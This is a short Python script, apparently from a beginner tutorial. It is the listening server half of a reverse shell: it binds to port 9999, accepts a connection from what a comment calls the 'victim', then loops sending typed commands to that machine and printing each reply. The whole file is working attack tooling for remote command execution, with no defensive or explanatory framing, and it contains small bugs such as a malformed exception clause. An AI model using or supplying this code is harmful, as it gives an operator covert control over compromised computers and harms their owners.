import socket
import sys

def creat_Socket():
	try:
		global host
		global port
		global s
		host=""
		port=9999
		s=socket.socket()
	except socket.error() as msg:
		print("Error "+msg)
def bind():
	try:
		global s
		global host
		global port
		s.bind((host,port))
		s.listen(5)
	except socket.error as msq:
		print("Error , Retrying ...."+str(msq))
		bind()
def accept():
	conn ,address = s.accept()
	print("Connection secured with IP : "+str(address[0])+" port "+str(address[1]))
	send_commands(conn)#this function we will create later for sending commands
		# to the other commputer using sys function
	conn.close()
	# Closing connection with victim
def send_commands(conn):
	while True:
		cmd = input("Enter command herre :")
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd))>0:
			conn.send(str.encode(cmd))
			client_response= str(conn.recv(1024),'utf-8')
			print(client_response,end="")
def main():
	creat_Socket()
	bind()
	accept()
main()

